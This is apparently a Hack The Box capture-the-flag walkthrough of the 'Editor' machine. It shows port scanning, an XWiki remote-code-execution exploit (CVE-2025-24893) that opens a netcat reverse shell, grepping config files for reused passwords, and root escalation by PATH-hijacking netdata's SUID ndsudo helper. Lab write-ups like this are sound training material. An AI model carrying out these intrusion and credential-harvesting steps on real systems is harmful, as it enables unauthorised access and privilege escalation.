- - - 
created : 11-08-2025 

Tags : #easy 

Released on 02 Aug 2025 (Season 8)
- - - 
# Machine Information

Services may take up to 5 minutes to load.
# Recon
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, then we use [Rustscan](../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Editor]
└─$ rustscan -a editor.htb -- -A 

Open 10.10.11.80:22
Open 10.10.11.80:80
Open 10.10.11.80:8080

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM

80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Editor - SimplistCode Pro
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD

8080/tcp open  http    syn-ack ttl 63 Jetty 10.0.20
|_http-server-header: Jetty(10.0.20)
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
|_http-open-proxy: Proxy might be redirecting requests
| http-title: XWiki - Main - Intro
|_Requested resource was http://editor.htb:8080/xwiki/bin/view/Main/
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|   WebDAV type: Unknown
|_  Server Type: Jetty(10.0.20)
| http-robots.txt: 50 disallowed entries (40 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
| /xwiki/bin/undelete/ /xwiki/bin/reset/ /xwiki/bin/register/ 
| /xwiki/bin/propupdate/ /xwiki/bin/propadd/ /xwiki/bin/propdisable/ 
| /xwiki/bin/propenable/ /xwiki/bin/propdelete/ /xwiki/bin/objectadd/ 
| /xwiki/bin/commentadd/ /xwiki/bin/commentsave/ /xwiki/bin/objectsync/ 
| /xwiki/bin/objectremove/ /xwiki/bin/attach/ /xwiki/bin/upload/ 
| /xwiki/bin/temp/ /xwiki/bin/downloadrev/ /xwiki/bin/dot/ 
| /xwiki/bin/delattachment/ /xwiki/bin/skin/ /xwiki/bin/jsx/ /xwiki/bin/ssx/ 
| /xwiki/bin/login/ /xwiki/bin/loginsubmit/ /xwiki/bin/loginerror/ 
|_/xwiki/bin/logout/
| http-methods: 
|   Supported Methods: OPTIONS GET HEAD PROPFIND LOCK UNLOCK
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=8/11%OT=22%CT=%CU=33436%PV=Y%DS=2%DC=T%G=N%TM=689A08DB
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(O
OS:1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11N
OS:W7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R
OS:=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%
OS:RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y
OS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RU
OS:D=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 36.312 days (since Sun Jul  6 09:45:37 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=255 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   35.95 ms 10.10.14.1
2   36.10 ms editor.htb (10.10.11.80)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:14
Completed NSE at 17:14, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:14
Completed NSE at 17:14, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:14
Completed NSE at 17:14, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.69 seconds
           Raw packets sent: 42 (2.682KB) | Rcvd: 29 (1.942KB)
```
# Enumeration
## HTTP (80)

Main page :

![Pasted image 20250811171846.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250811171846.png)
## HTTP (8080)

Main page :
![Pasted image 20250811172025.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250811172025.png)

More Info:
```bash
Version: SimplistCode Pro 1.1 
```
# Exploit

Google searching we find out **[CVE-2025-24893](https://github.com/dollarboysushil/CVE-2025-24893-XWiki-Unauthenticated-RCE-Exploit-POC)** is applicable here

![Pasted image 20250811172640.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250811172640.png)

We download the [Script](../../../3%20-%20Tags/Hacking%20Concepts/Script.md), then open a [Netcat](../../../3%20-%20Tags/Hacking%20Tools/Netcat.md) listener :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Editor]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
```

Now we run the [Exploit](../../../3%20-%20Tags/Hacking%20Concepts/Exploit.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Editor]
└─$ python3 CVE-2025-24893-dbs.py                                             

[?] Enter target URL (including http:// or https:// e.g http://10.10.10.18.10:8080): http://editor.htb:8080
```

And we have a [Reverse Shell](../../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md) on the listener :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Editor]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.174] from (UNKNOWN) [10.10.11.80] 46148
sh: 0: cant access tty; job control turned off
$ whoami
xwiki
```
### Shell Stabilization

Now for better working on the system we can perform [Shell Stabilization](../../../3%20-%20Tags/Hacking%20Concepts/Shell%20Stabilization.md) .
# Privilege Escalation
## XWiki to Oliver 

We have a [Shell](../../../3%20-%20Tags/Hacking%20Concepts/Shell.md) as `xwiki`, we can't access `oliver` home and user flag so we need to find a way to start [Privilege Escalation](../../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md)., trying to search for `password` :

```bash
xwiki@editor:/tmp$ grep -ri 'password' /var/www /opt /etc

/etc/xwiki/hibernate.cfg.xml:    <property name="hibernate.connection.password">HTB{{REDACTED_PASSWD}}</property>
/etc/xwiki/hibernate.cfg.xml:    <property name="hibernate.connection.password">xwiki</property>
/etc/xwiki/hibernate.cfg.xml:    <property name="hibernate.connection.password">xwiki</property>
/etc/xwiki/hibernate.cfg.xml:    <property name="hibernate.connection.password"></property>
/etc/xwiki/hibernate.cfg.xml:    <property name="hibernate.connection.password">xwiki</property>
/etc/xwiki/hibernate.cfg.xml:    <property name="hibernate.connection.password">xwiki</property>
/etc/xwiki/hibernate.cfg.xml:    <property name="hibernate.connection.password"></property>
/etc/xwiki/xwiki.properties:#-# * password: the password to use to authenticate to the repository
/etc/xwiki/xwiki.properties:# extension.repositories.privatemavenid.auth.password = thepassword
/etc/xwiki/xwiki.properties:#-# Define the lifetime of the token used for resetting passwords in 
```

Seems we have a password, let's try reuse on [SSH](../../../3%20-%20Tags/Hacking%20Concepts/SSH.md).
### SSH (22)

We'll use the found password for the user `oliver` :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Editor]
└─$ ssh oliver@editor.htb            

Last login: Mon Aug 11 16:43:06 2025 from 10.10.14.174
oliver@editor:~$ ls
user.txt
oliver@editor:~$ cat user.txt
   HTB{{REDACTED_FLAG}} 
```
## Oliver to Root

We find SUID files :

```go
oliver@editor:~$ find / user root -perm -4000 -print 2>/dev/null                                                                                           
/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network                                                                                                  
/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin                                                                                           
/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners                                                                                                 
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo                                                                                                          
/opt/netdata/usr/libexec/netdata/plugins.d/ioping                                                                                                          
/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin                                                                                                   
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin                                                                                                     
/usr/bin/newgrp                                                                                                                                            
/usr/bin/gpasswd                                                                                                                                           
/usr/bin/su                                                                                                                                                
/usr/bin/umount                                                                                                                                            
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
```

`/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo` it's the interesting one here :

![Pasted image 20250811185252.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250811185252.png)

We download the `poc.c` file and compile it with this command :

```bash
gcc poc.c -o nvme
```

Now move the compiled `nvme` binary to a directory writable by your user, such as `/tmp`:

```go
scp nvme oliver@editor.htb:/tmp/
```

Checking :

```go
oliver@editor:/tmp$ ls
netdata-ipc
nvme
systemd-private-0d2465c0d64643cbae367fd7b0b1ac77-fwupd.service-NIzymF
systemd-private-0d2465c0d64643cbae367fd7b0b1ac77-ModemManager.service-y3WM4g
systemd-private-0d2465c0d64643cbae367fd7b0b1ac77-systemd-logind.service-jfGiNV
systemd-private-0d2465c0d64643cbae367fd7b0b1ac77-systemd-resolved.service-NDMbTQ
systemd-private-0d2465c0d64643cbae367fd7b0b1ac77-systemd-timesyncd.service-YHqBNH
systemd-private-0d2465c0d64643cbae367fd7b0b1ac77-upower.service-e7DqPg
systemd-private-0d2465c0d64643cbae367fd7b0b1ac77-xwiki.service-B4FwmK
vmware-root_604-2731152132
```

We have to make it executable :

```bash
chmod +x /tmp/nvme
```

And prepend its directory to our `PATH` :

```bash
export PATH=/tmp:$PATH
```

This ensures `ndsudo` will resolve and execute your malicious `nvme` instead of the legitimate one.

Now we can run the vulnerable command to trigger `ndsudo`:

```bash
oliver@editor:/tmp$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list

root@editor:/tmp# cd --
bash: cd: HOME not set
root@editor:/tmp# cd /root
root@editor:/root# ls
root.txt  scripts  snap
root@editor:/root# cat root.txt 
  HTB{{REDACTED_FLAG}}
```

Pwned !!

